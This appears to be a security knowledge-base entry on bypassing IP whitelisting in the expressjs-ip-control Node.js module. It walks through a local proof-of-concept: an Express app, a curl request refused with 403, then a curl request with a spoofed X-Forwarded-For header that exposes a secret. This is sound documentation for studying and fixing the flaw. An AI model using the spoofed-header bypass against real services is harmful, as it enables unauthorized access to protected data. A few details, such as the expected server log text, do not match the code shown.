---
tags:
  - authorization-bypass
  - ip-whitelist
  - x-forwarded-for
  - node-js
  - express
  - header-spoofing
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/node]]'
  - '[[tools/curl]]'
  - '[[tools/Express]]'
tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
verified: false
platforms:
  - Web
  - Node.js
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Install-expressjs-ip-control-Module]]'
  - '[[procedures/Create-POC-Express-Application]]'
  - '[[procedures/Start-POC-Server]]'
  - '[[procedures/Test-Access-Without-Spoofing]]'
  - '[[procedures/Bypass-Whitelist-with-Spoofed-Header]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:36.583Z'
description: >-
  Demonstrates bypassing IP whitelisting in the expressjs-ip-control Node.js
  module by spoofing the client-controlled X-Forwarded-For header, leading to
  unauthorized access and sensitive data disclosure.
id: a4ac52d7-4261-47b3-949d-a35a7980a1a3
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Defense Evasion]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Authorization Bypass via X-Forwarded-For Header Spoofing in expressjs-ip-control

Multi-stage attack chain demonstrating the exploitation of a vulnerability in the expressjs-ip-control Node.js module, where IP whitelisting can be bypassed by manipulating the trusted X-Forwarded-For header. This allows unauthorized access to protected endpoints, potentially disclosing sensitive information such as secret tokens. The chain involves setting up a vulnerable environment, testing controls, and exploiting the flaw.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Environment] --> B[Configure Vulnerable App]
    B --> C[Launch Server]
    C --> D[Test Controls]
    D --> E[Exploit Bypass]
    E --> F[Access Sensitive Data]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#e74c3c
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/node]]
- [[tools/curl]]
- [[tools/Express]]

### Target Environment

- Node.js runtime (version 14+ recommended)
- Local network access to port 3000
- No remote services required; runs locally for POC

### Initial Access Requirements

- Local machine with Node.js installed
- No credentials needed; exploits client-side header manipulation
- Administrative privileges not required

## Detailed Attack Procedures

### Step 1: Install the Vulnerable Module
procedure: [[procedures/Install-expressjs-ip-control-Module]]

**Objective**: Set up the vulnerable expressjs-ip-control module in a Node.js project to enable IP whitelisting functionality.

**Instructions**: Use [[commands/npm-install-expressjs-ip-control]] to install the module via npm. This prepares the environment for integrating the middleware into an Express application.

```bash
npm i expressjs-ip-control
```

If Express is not installed, also run [[commands/npm-install-express]]:

```bash
npm i express
```

**Expected Output**: Installation logs confirming the module is added to node_modules and package.json.

**Success Indicators**:
- Module files appear in node_modules/expressjs-ip-control
- No errors during installation

### Step 2: Create Proof-of-Concept Express Application
procedure: [[procedures/Create-POC-Express-Application]]

**Objective**: Develop a simple Express app that uses the ipControl middleware to enforce IP whitelisting on a protected endpoint returning sensitive data.

**Instructions**: Create a file named poc.js with the following content to set up the server, configure whitelisting for IPs like 127.0.0.1 and 192.168.10.10, and protect the root endpoint with a secret token response. No command execution here; manually write the code.

Example poc.js structure:

```javascript
const express = require('express');
const ipControl = require('expressjs-ip-control');
const app = express();

app.use('/', ipControl(['127.0.0.1', '192.168.10.10']));

app.get('/', (req, res) => {
  res.send('SECRET TOKEN ACCESSIBLE ONLY BY LOCAL PC');
});

app.listen(3000, () => console.log('Server on 3000'));
```

**Expected Output**: A valid JavaScript file ready for execution.

**Success Indicators**:
- File poc.js created without syntax errors
- Middleware configured to block non-whitelisted IPs

### Step 3: Start the Proof-of-Concept Server
procedure: [[procedures/Start-POC-Server]]

**Objective**: Launch the Express server to host the vulnerable application locally.

**Instructions**: Execute [[commands/node-run-poc]] to start the server on port 3000.

```bash
node poc.js
```

**Expected Output**: Console message "Server listening on port 3000".

**Success Indicators**:
- Server starts without errors
- Accessible via localhost:3000 (though protected)

### Step 4: Test Access Without Spoofing
procedure: [[procedures/Test-Access-Without-Spoofing]]

**Objective**: Verify that the IP whitelist is enforced correctly by attempting access without any spoofed headers.

**Instructions**: Send a GET request using [[commands/curl-test-without-header]] to the root endpoint.

```bash
curl 'http://localhost:3000/'
```

**Expected Output**: 403 Forbidden response with message "You do not have rights to visit this page".

**Success Indicators**:
- Access denied due to non-whitelisted IP
- Confirms the control is active before exploitation

### Step 5: Bypass Whitelist with Spoofed Header
procedure: [[procedures/Bypass-Whitelist-with-Spoofed-Header]]

**Objective**: Exploit the vulnerability by spoofing the X-Forwarded-For header to mimic a whitelisted IP, gaining unauthorized access.

**Instructions**: Send a GET request using [[commands/curl-bypass-with-header]] with the X-Forwarded-For header set to 127.0.0.1.

```bash
curl 'http://localhost:3000/' -H 'X-Forwarded-For: 127.0.0.1'
```

**Expected Output**: 200 OK response disclosing "SECRET TOKEN ACCESSIBLE ONLY BY LOCAL PC".

**Success Indicators**:
- Protected content returned successfully
- Authorization bypassed, demonstrating info disclosure

## Attack Chain Summary

### Key Achievements

1. Installed and configured a vulnerable IP control module in a Node.js Express app
2. Verified whitelist enforcement on protected endpoints
3. Bypassed controls via header manipulation to access sensitive data

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Defense Evasion]]

---
*Last updated: 2023-10-01T00:00:00Z*
